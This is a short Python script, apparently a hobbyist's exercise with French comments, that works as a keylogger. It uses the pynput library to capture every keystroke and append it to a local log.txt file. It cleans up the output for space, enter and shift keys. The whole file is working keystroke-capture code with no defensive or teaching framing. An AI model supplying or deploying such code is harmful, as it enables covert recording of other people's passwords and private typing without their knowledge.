from pynput.keyboard import Listener

def ecrire_Au_Fichier(touche):

    #Logique formatage de la sortie
    Lettre = str(touche) #PROBLEME : sortie de base, si la touche est [A] la sortie sera 'A'
    Lettre = Lettre.replace("'", "") #FIX : Ajuster l'impression de la lettre pour remplacer les "'" par rien

    if Lettre == 'Key.space':
        Lettre = ' '

    elif Lettre == 'Key.enter':
        Lettre = '\n'

    elif Lettre == 'Key.shift_r' or Lettre == 'Key.shift':
        Lettre = ''

    #Logique impression dans le fichier
    with open("log.txt", "a") as fichier:
        fichier.write(Lettre)

with Listener(on_press=ecrire_Au_Fichier) as L: # L est un listener
    L.join() #on append les données

#Je suis le meilleur